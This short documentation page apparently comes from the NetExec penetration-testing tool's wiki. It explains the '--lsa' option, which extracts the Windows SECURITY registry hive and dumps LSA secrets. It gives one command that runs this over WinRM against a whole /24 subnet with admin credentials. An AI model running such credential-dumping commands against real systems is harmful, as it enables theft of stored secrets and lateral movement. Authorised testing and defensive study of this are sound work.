title: Dump LSA
html:
Dump LSA

Dump LSA secrets

Extracts and downloads SECURITY registry hive, and uses secretsdump.py methods locally to dump secrets

{% include "../../.gitbook/includes/admin-privs.md" %}

nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
excerpt: Dump LSA Dump LSA secrets Extracts and downloads SECURITY registry hive, and uses secretsdump.py methods locally to dump secrets {% include "../../.gitbook/includes/admin-privs.md" %} nxc winrm 192 .1
